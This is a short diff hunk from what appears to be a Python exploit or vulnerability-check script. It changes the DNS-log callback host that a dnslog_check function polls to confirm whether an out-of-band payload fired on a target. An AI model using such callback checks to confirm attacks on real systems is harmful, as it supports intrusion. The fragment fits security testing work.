@@ -30,7 +30,7 @@ def build_payload(cmd=""):
 
 
 def dnslog_check(hash_str):
-    url = "http://dnslog.niufuren.cc/api/dns/devil/{}/".format(hash_str)
+    url = "http://dnslog.yoyostay.top/api/dns/devil/{}/".format(hash_str)
     # url = "http://{}:8088/{}".format(server, hash_str)
     try:
         content = urllib2.urlopen(url, timeout=5).read()
